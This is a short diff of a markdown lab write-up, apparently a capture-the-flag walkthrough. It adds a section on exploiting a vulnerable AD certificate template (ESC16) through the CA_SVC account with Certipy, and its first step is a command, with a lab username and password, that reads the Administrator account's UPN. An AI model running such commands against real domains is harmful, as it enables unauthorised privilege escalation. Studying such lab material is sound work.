@@ -658,4 +658,9 @@ We found that the template which is vulnerable is ES16 after researching for a b
 
 Lets try to exploit it
 
-### Exploit the CA_SVC
+### Exploit the CA_SVC **with Certipy**
+
+**Step 1: Read initial UPN of the victim account**
+```bash
+certipy account -u 'p.agile@fluffy.local' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'Administrator' read
+```
